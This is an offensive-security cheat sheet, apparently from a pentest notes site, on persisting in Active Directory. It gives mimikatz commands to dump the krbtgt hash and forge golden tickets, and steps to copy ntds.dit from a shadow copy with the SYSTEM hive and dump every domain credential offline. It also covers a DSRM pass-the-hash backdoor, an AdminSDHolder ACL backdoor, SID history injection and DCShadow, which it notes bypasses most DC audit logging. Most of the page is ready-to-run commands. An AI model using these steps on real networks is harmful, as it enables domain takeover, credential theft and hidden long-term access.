# AD Persistence

!!! warning "Watch out"
    Golden tickets and shadow copies are high-noise persistence mechanisms. In a real engagement, document and demonstrate rather than leaving active backdoors — clean up after yourself.

---

## Golden Ticket Persistence

### Extract the `krbtgt` Hash

```powershell
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
```

Output:

```
RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```

### Forge a Golden Ticket

```powershell
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

### Verify and Use

```powershell
klist
```

```powershell
.\PsExec.exe \\dc1 cmd.exe
```

---

## Shadow Copy Persistence

### Create a Shadow Copy

```powershell
C:\Tools\vshadow.exe -nw -p C:
```

Output:

```
- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Copy NTDS Database

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

### Extract SYSTEM Hive

```powershell
reg.exe save hklm\system c:\system.bak
```

### Dump Credentials Offline

Transfer `ntds.dit.bak` and `system.bak` to the attacker machine, then:

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

## DSRM Admin Account

Every DC has a local `Administrator` account in Directory Services Restore Mode. If you enable password sync, you can log in to the DC with its hash using pass-the-hash over network logon.

### Dump DSRM hash from a DC

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

### Enable network logon for DSRM

```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

### Use it

```bash
impacket-psexec -hashes :<DSRM-NTLM> DC01/Administrator@10.10.10.10
```

---

## AdminSDHolder

The ACL on `CN=AdminSDHolder,CN=System,DC=example,DC=com` is copied to all protected accounts (adminCount=1) every 60 minutes by the SDProp process. Modifying AdminSDHolder's ACL creates persistent rights on Domain Admins and every other protected account.

```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=example,DC=com' -PrincipalIdentity <attacker> -Rights All
```

Wait up to 60 minutes, then re-check Domain Admin ACLs — your rights will have propagated.

---

## SID History Injection

Modify a user's `sidHistory` attribute to include Enterprise Admins or DA SIDs. Kerberos trusts SIDs in the TGT regardless of current group membership — the user becomes effectively privileged even after the account is reset.

```
mimikatz # sid::add /sam:<attacker> /new:<DA-sid>
```

Requires DC-level access (DCShadow or direct NTDS write) — not a foothold technique, but durable once set.

---

## DCShadow

Register a rogue DC long enough to push ACL changes, backdoor accounts, or SID history modifications directly into the replication stream. Bypasses most DC audit logging.

```
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:<user> /attribute:primaryGroupID /value:512
mimikatz # lsadump::dcshadow /push
```

!!! warning "Operational"
    DCShadow requires local SYSTEM on a machine with DC-level replication rights (DA or equivalent). It's a persistence amplifier — use it to entrench, not to escalate.
